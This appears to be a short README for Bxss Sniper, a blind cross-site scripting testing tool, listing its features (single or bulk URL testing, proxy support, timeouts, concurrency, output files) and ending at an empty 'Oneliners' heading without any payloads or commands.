# Bxss Sniper

Bxss Sniper is a web application penetration testing tool designed for Blind Cross-Site Scripting (BXSS) detection. This ethical hacking tool empowers security professionals and developers to identify and analyze potential BXSS vulnerabilities in web applications.

### Features

- **Blind XSS Detection:** Bxss Sniper specializes in detecting and testing for Blind Cross-Site Scripting vulnerabilities in web applications.

- **Flexible Testing Options:** Test a single URL or multiple URLs using a file containing a list of targets.

- **Silent Mode:** Enable silent mode to print only the output without displaying the banner and version information.

- **Output Customization:** Specify an output file to save the results for further analysis.

- **Proxy Support:** Switching proxies allows you to send requests through your configured proxy, such as Burp Suite.

- **Timeout Configuration:** Customize the timeout duration for requests, useful for both regular testing and integration with tools like Burp Suite.

- **Concurrency Control:** Adjust the concurrency level for multiple processes, enhancing the efficiency of the testing process.

- **Support Oneliners:** Bxss Sniper supports oneliners to improve your reconnaissance

### Oneliners:
